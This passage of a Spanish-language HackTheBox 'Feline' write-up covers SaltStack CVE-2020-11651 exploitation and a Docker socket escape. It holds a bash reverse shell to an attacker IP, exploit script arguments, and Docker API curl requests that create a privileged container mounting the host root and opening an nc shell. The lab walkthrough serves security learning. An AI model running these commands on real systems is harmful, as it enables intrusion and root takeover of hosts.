<p>Entonces, empecemos con el de <a href="https://github.com/jasperla/CVE-2020-11651-poc"><code>jasperla</code></a> a ver si obtenemos éxito con este, su ejecución es sencilla e intuitiva, además en el código viene el puerto <code>4506</code> por defecto, pero pues probemos que pasa con el <code>4505</code>.</p>

<pre><code class="language-py">def main():
    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')
    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')
    parser.add_argument('--port', '-p', dest='master_port', default='4506')
    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')
    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')
    parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')
    parser.add_argument('--read', '-r', dest='read_file')
    parser.add_argument('--upload-src', dest='upload_src')
    parser.add_argument('--upload-dest', dest='upload_dest')
    parser.add_argument('--exec', dest='exec', help='Run a command on the master')
    parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')
    args = parser.parse_args()
</code></pre>

<pre><code class="language-bash">–» python3 exploit.py --port 4505 --exec 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.218/4434 0&gt;&amp;1"'
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4505) status... OFFLINE
</code></pre>

<p>Él offline quiere decir que intento hacer ping y no consiguió respuesta, así que hagamos el forwarding pero con el puerto <code>4506</code>, y ejecutemos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_containerbash.png" alt="274bash_containerbash" /></p>

<p>(Ni con <code>nc ip port -e /bin/bash</code> ni con la versión antigua de <code>nc</code> obtuve ninguna respuesta)</p>

<p>Lindo lindo, obtenemos una shell sobre el contenedor del puerto <code>4506</code>, hacemos tratamiento de la TTY yyyy vemos cositas interesantes:</p>

<ul>
  <li>Tenemos un archivo <code>todo.txt</code>.</li>
  <li>Curioso que el archivo <code>.bash_history</code> tiene contenido.</li>
</ul>

<pre><code class="language-bash">root@2d24bf61767c:~# cat todo.txt 
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
</code></pre>

<pre><code class="language-bash">root@2d24bf61767c:~# cat .bash_history
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' &gt; todo.txt
cat todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' &gt; todo.txt
cat todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' &gt; todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' &gt; todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' &gt; todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' &gt; todo.txt
cat todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' &gt; todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit
</code></pre>

<p>Vemos en la última línea algo curioso, <code>/var/run/docker.sock</code>. Antes de cualquier cosa, entendamos que hace ese archivo:</p>

<blockquote>
  <p>Communicate with the Docker daemon from within a container. <a href="https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd">Medium.com/better-programming</a></p>
</blockquote>

<p>Como se explica en el post anterior, se basa en un demonio, el cual queda escuchando mediante el archivo <code>docker.sock</code>, principalmente es el punto de entrada para usar <code>Docker API</code>, lo que nos permite comunicarnos hacia el <code>host (contenedor)</code> principal. Mediante él podemos crear contenedores, inspeccionarlos, borrarlos, enviar peticiones y también enviar comandos (:</p>

<p>Más info:</p>

<ul>
  <li><a href="https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd">About /var/run/docker.sock - Medium/better-programming</a>.</li>
  <li><a href="https://stackoverflow.com/questions/35110146/can-anyone-explain-docker-sock/35110344">Can anyone explain docker.sock - Stackoverflow</a>.</li>
  <li><a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">Daemon socket option - Docs.docker</a>.</li>
</ul>

<blockquote>
  <p>By default, a unix domain socket (or IPC socket) is created at /var/run/docker.sock, requiring either <code>root</code> permission, or <code>docker group</code> membership.</p>
</blockquote>

<p>Lo que quiere decir que estamos ejecutando peticiones como usuario administrador del contenedor.</p>

<p>…</p>

<p>Con esto en mente y entendiendo que hace, pues retomemos lo que encontramos en el archivo <code>.bash_history</code>:</p>

<pre><code class="language-bash">root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
</code></pre>

<pre><code class="language-json">[
   {
      "Containers":-1,
      "Created":1590787186,
      "Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
      "Labels":null,
      "ParentId":"",
      "RepoDigests":null,
      "RepoTags":[
         "sandbox:latest"
      ],
      "SharedSize":-1,
      "Size":5574537,
      "VirtualSize":5574537
   },
   {
      "Containers":-1,
      "Created":1588544489,
      "Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
      "Labels":null,
      "ParentId":"",
      "RepoDigests":[
         "&lt;none&gt;@&lt;none&gt;"
      ],
      "RepoTags":[
         "&lt;none&gt;:&lt;none&gt;"
      ],
      "SharedSize":-1,
      "Size":1056679100,
      "VirtualSize":1056679100
   }
]
</code></pre>

<p>Tenemos únicamente la imagen de <code>sandbox</code>, veamos que contenedores hay:</p>

<blockquote>
  <p>Las imagenes Docker son plantillas (que incluyen una aplicación, los binarios y las librerias necesarias) que se utilizan para construir contenedores <code>Docker</code>. <a href="https://eltallerdelbit.com/imagenes-docker/">ElTallerdelBit</a></p>
</blockquote>

<pre><code class="language-bash">root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
</code></pre>

<pre><code class="language-json">[
   {
      "Id":"2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2",
      "Names":[
         "/saltstack"
      ],
      "Image":"188a2704d8b0",
      "ImageID":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
      "Command":"/usr/bin/dumb-init /usr/local/bin/saltinit",
      "Created":1593520419,
      "Ports":[
         {
            "PrivatePort":22,
            "Type":"tcp"
         },
         {
            "IP":"127.0.0.1",
            "PrivatePort":4505,
            "PublicPort":4505,
            "Type":"tcp"
         },
         {
            "IP":"127.0.0.1",
            "PrivatePort":4506,
            "PublicPort":4506,
            "Type":"tcp"
         },
         {
            "IP":"127.0.0.1",
            "PrivatePort":8000,
            "PublicPort":8000,
            "Type":"tcp"
         }
      ],
      "Labels":{
         
      },
      "State":"running",
      "Status":"Up 18 hours",
      "HostConfig":{
         "NetworkMode":"default"
      },
      "NetworkSettings":{
         "Networks":{
            "bridge":{
               "IPAMConfig":null,
               "Links":null,
               "Aliases":null,
               "NetworkID":"b4f085309fd324b75ee7b6982cb132fe7c9161732a000160fc79c8c5250492b0",
               "EndpointID":"c457d7e08e1a5cfa6d124bd5a9fdff00b15edf121558d1a96ed12bfa0720a3e3",
               "Gateway":"172.17.0.1",
               "IPAddress":"172.17.0.2",
               "IPPrefixLen":16,
               "IPv6Gateway":"",
               "GlobalIPv6Address":"",
               "GlobalIPv6PrefixLen":0,
               "MacAddress":"02:42:ac:11:00:02",
               "DriverOpts":null
            }
         }
      },
      "Mounts":[
         {
            "Type":"bind",
            "Source":"/var/run/docker.sock",
            "Destination":"/var/run/docker.sock",
            "Mode":"",
            "RW":true,
            "Propagation":"rprivate"
         }
      ]
   }
]
</code></pre>

<p>Listones, podemos extraer el nombre y el ID del contenedor, pero nada más, pues busquemos en internet como podemos aprovecharnos del demonio :)</p>

<blockquote>
  <p>Exposing /var/run/docker.sock could lead to full environment takeover. <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">Dejandayoff.com</a></p>
</blockquote>

<p>Encontramos varias maneras con las cuales podemos romperlo. Podemos usar la opción <code>exec</code>, que simplemente cuando sea llamada será ejecutada sobre el contenedor. Acá podemos indicarle el comando que queremos ejecutar:</p>

<ul>
  <li><a href="https://stackoverflow.com/questions/40844197/what-is-the-docker-security-risk-of-var-run-docker-sock">Riesgos al tener el demonio <code>/var/run/docker.sock</code> accesible - Stackoverflow.com</a>.</li>
  <li><a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">Peligros de exponer el demonio <code>docker.sock</code> - Dejandayoff.com</a>.</li>
</ul>

<pre><code class="language-bash">root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2/exec
HTTP/1.1 201 Created
Api-Version: 1.40
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)
Date: Tue, 22 Dec 2020 23:28:09 GMT
Content-Length: 74

{"Id":"eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc"}
</code></pre>

<p>Con lo anterior creamos un ID para esa tarea <code>exec</code> que queremos ejecutar, así que ahora le indicamos que nos lo ejecute:</p>

<pre><code class="language-bash">root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.40
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)

root@2d24bf61767c:~# 
</code></pre>

<p>Pero no pasa nada :P</p>

<p>Después de probar varias cositas, lo único que me dio respuesta fue hacer una petición hacia mí máquina mediante <code>wget</code> o <code>curl</code>, pero no pude hacer nada con eso… Así que seguí buscando.</p>

<p>Algunos buenos post que intente y que explican muy bien:</p>

<ul>
  <li><a href="https://www.redtimmy.com/a-tale-of-escaping-a-hardened-docker-container/">A tale of escaping a hardened docker container - RedTimmy.com</a>.</li>
  <li><a href="https://www.ctl.io/developers/blog/post/tutorial-understanding-the-security-risks-of-running-docker-containers">Understanding security risks of running docker containers - Ctl.io</a>.</li>
  <li><a href="https://securityboulevard.com/2019/02/abusing-docker-api-socket/">Abusing Docker API - SecurityBoulevard.com</a>.</li>
</ul>

<p>Este último tiene varios links también de apoyo con lindas referencias, miraremos una de ellas:</p>

<ul>
  <li><a href="https://cert.litnet.lt/2016/11/owning-system-through-an-exposed-docker-engine/">Owning system through exposed docker engine - Cert.litnet.lt</a>.</li>
</ul>

<p>En él nos muestra como obtener ejecución de comandos mediante la creación de un contenedor además de hacer una montura sobre la carpeta que le indiquemos; nosotros usaremos la imagen de <code>sandbox</code> para la creación del contenedor:</p>

<pre><code class="language-bash">root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" http://localhost/containers/create?name=entramosOno -d '{"Image":"sandbox", "Cmd":["/usr/bin/nc", "10.10.14.218", "4435", "-e", "/bin/sh"], "Binds": [ "/:/montadoPA" ], "Privileged": true}'
</code></pre>

<p>Entonces, le indicamos que nos cree un <code>container</code> con el nombre <code>entramosOno</code>, que use la imagen <code>sandbox</code> y que cuando se ejecute haga una petición mediante <code>nc</code> a nuestra máquina para obtener una shell. Además de montar la raíz (<code>/</code>) del sistema sobre la ruta <code>montadoPA</code> del contenedor :)</p>

<p>Démosle:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_dockersock_shell.png" alt="274bash_dockersock_shell" /></p>

<p>Perfecto, obtenemos la shell, veamos si tenemos la montura:</p>

<pre><code class="language-bash">ls -la /
total 68
drwxr-xr-x    1 root     root          4096 Dec 23 00:45 .
drwxr-xr-x    1 root     root          4096 Dec 23 00:45 ..
-rwxr-xr-x    1 root     root             0 Dec 23 00:45 .dockerenv
drwxr-xr-x    2 root     root          4096 May 29  2020 bin
drwxr-xr-x   13 root     root          3740 Dec 23 00:45 dev
drwxr-xr-x    1 root     root          4096 Dec 23 00:45 etc
drwxr-xr-x    2 root     root          4096 May 29  2020 home
drwxr-xr-x    7 root     root          4096 May 29  2020 lib
drwxr-xr-x    5 root     root          4096 May 29  2020 media
drwxr-xr-x    2 root     root          4096 May 29  2020 mnt
drwxr-xr-x   20 root     root          4096 Jun 30 12:47 montadoPA
drwxr-xr-x    2 root     root          4096 May 29  2020 opt
dr-xr-xr-x  205 root     root             0 Dec 23 00:45 proc
drwx------    2 root     root          4096 May 29  2020 root
drwxr-xr-x    2 root     root          4096 May 29  2020 run
drwxr-xr-x    2 root     root          4096 May 29  2020 sbin
drwxr-xr-x    2 root     root          4096 May 29  2020 srv
dr-xr-xr-x   13 root     root             0 Dec 23 00:45 sys
drwxrwxrwt    2 root     root          4096 May 29  2020 tmp
drwxr-xr-x    7 root     root          4096 May 29  2020 usr
drwxr-xr-x   12 root     root          4096 May 29  2020 var
</code></pre>

<p>Montado PAAAAAAA:</p>

<pre><code class="language-bash">ls -la /root     
total 8
drwx------    2 root     root          4096 May 29  2020 .
drwxr-xr-x    1 root     root          4096 Dec 23 00:50 ..

ls -la /montadoPA/root
total 56
drwx------    6 root     root          4096 Dec 22 20:05 .
drwxr-xr-x   20 root     root          4096 Jun 30 12:47 ..
lrwxrwxrwx    1 root     root             9 Jun 17  2020 .bash_history -&gt; /dev/null
-rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
drwx------    2 root     root          4096 Jun 30 09:23 .cache
drwxr-xr-x    3 root     root          4096 Jun 30 09:31 .local
-rw-r--r--    1 root     root           161 Dec  5  2019 .profile
-rw-r--r--    1 root     root            75 Jun 30 10:23 .selected_editor
drwx------    2 root     root          4096 Jun 30 09:10 .ssh
-rw-------    1 root     root         12235 Aug 26 14:28 .viminfo
-rw-r--r--    1 root     root           165 Jun 30 11:59 .wget-hsts
-rw-------    1 root     root            33 Dec 22 05:10 root.txt
drwxr-xr-x    3 root     root          4096 May 18  2020 snap
</code></pre>

<p>El único “problema” que veo es que no puedo ponerme una linda shell:</p>

<pre><code class="language-bash"># valid login shells
/bin/sh
/bin/ash
</code></pre>

<p>Podríamos enumerar sobre el contenedor y sobre la montura del sistema para así intentar obtener una shell completamente interactiva, pero con lo que respecta a la máquina hemos finalizado :P</p>

<p>Solo nos quedaría ver las flags:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274flags.png" alt="274flags" /></p>

<p>…</p>

<p>Y nada más. Impresionante máquina eh! Docker no deja de sorprenderme :P Aprendí mucho, el inicio (como casi siempre) es lo más caótico, pero me pareció superinteresante, además de ser una vulnerabilidad que no conocía. El pivoteo entre contenedores… lindo lindo :)</p>

<p>Muchas gracias por pasarse y nos leeremos en otra ocasión :) a seguir rompiendo todo.</p>

</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->




<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments">
    <button class="btn btn-dark show-comments">Comentarios</button>         
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       


<!-- Share -->
<div class="share">
    <p>
        Vacios
    </p>
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Feline&url=http://localhost:4000/htb/feline" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fas fa-cube"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fab fa-github"></i>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->
<!-- Related Posts
================================================== -->
<div class=" related-posts ">  

    
    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
    
    
    <div class="d-flex justify-content-center align-items-center">

    <!-- Tags -->  
    
                    
    <a class="smoothscroll badge badge-primary" href="/tags#demon">demon</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#deserialization">deserialization</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#docker">docker</a>               
    
    
    <!-- Categories -->
    
    
    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
    

    </div>

    
    
    
    <div class="blog-grid-container">
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/thenotebook">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
                
            </h2>
            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">31 Jul 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/ophiuchi">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png" alt="HackTheBox - Ophiuchi"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/ophiuchi">HackTheBox - Ophiuchi</a>
                
            </h2>
            <h4 class="card-text">Máquina Linux nivel medio. La deserialización no puede faltar, pero esta vez parseando sintaxis YAML. Enumeración básica y finalmente tendremos que jugar con instrucciones de WebAssembly para modificar una constante...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">03 Jul 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/tenet">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" alt="HackTheBox - Tenet"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/tenet">HackTheBox - Tenet</a>
                
            </h2>
            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos deserialización insegura de objetos en PHP, reutilización de contraseñas y encontraremos pequeños fallos en scripts de bash :P

</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">12 Jun 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
                
        </div>        
</div>

<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->

    </div>

    
    <!-- Newsletter
    ================================================== -->
    <div class="newsletter text-center">
        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
        <p></p>
    </div>
    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-left">
                Copyright © 2022 Sh0x blog 
            </div>
            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


</body>
</html>
